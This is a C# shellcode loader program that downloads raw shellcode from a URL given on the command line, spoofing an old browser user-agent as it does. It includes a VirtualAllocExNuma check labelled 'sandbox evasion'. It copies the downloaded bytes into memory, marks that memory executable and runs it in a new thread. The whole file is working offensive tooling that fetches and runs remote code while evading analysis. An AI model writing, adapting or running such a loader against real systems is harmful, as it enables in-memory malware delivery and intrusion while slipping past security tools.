using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace CreateThread
{
    internal class Program
    {
        static void Main(string[] args)
        {
            byte[] shellcode;

            if (args == null || args.Length == 0)
            {
                throw new ApplicationException("Specify the URL of the shellcode to retrieve.");
            }

            // Sandbox evasion
            IntPtr mem = Win32.VirtualAllocExNuma(Win32.GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            var client = new WebClient();

            // Add a user agent header in case the requested URI contains a query.
            client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");

            shellcode = client.DownloadData(args[0]);

            // Allocate a region of memory in this process as RW
            var baseAddress = Win32.VirtualAlloc(
                IntPtr.Zero,
                (uint)shellcode.Length,
                Win32.AllocationType.Commit | Win32.AllocationType.Reserve,
                Win32.MemoryProtection.ReadWrite);

            // Copy the shellcode into the memory region
            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            // Change memory region to RX
            Win32.VirtualProtect(
                baseAddress,
                (uint)shellcode.Length,
                Win32.MemoryProtection.ExecuteRead,
                out _);

            // Execute shellcode
            var hThread = Win32.CreateThread(
                IntPtr.Zero,
                0,
                baseAddress,
                IntPtr.Zero,
                0,
                out _);

            // Wait infinitely on this thread to stop the process exiting
            Win32.WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}